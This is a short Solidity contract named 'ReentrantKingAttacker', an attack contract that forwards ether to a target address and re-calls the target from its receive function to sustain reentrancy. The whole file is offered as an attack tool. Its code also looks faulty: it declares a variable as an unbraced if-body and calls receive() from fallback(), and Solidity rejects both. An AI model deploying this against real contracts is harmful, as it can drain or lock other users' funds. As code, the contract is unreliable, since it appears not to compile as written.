pragma solidity ^0.8.0;

contract ReentrantKingAttacker {
    address private immutable _target;

    constructor(address targetAddress) {
        _target = payable(targetAddress);
    }

    function attack() public payable {
        (bool success, ) = _target.call{value: msg.value}('');
        require(success, "Attack to target failed");
    }

    receive() external payable {
        // Automatically attack with a small fee (1 wei) to keep reentrancy
        if (address(this).balance < 1000000000000000)
            (bool feeSuccess, ) = _target.call{value: 1}('');
            require(feeSuccess, "Reentrancy fee failed");
    }

    fallback() external payable {
        receive();
    }
}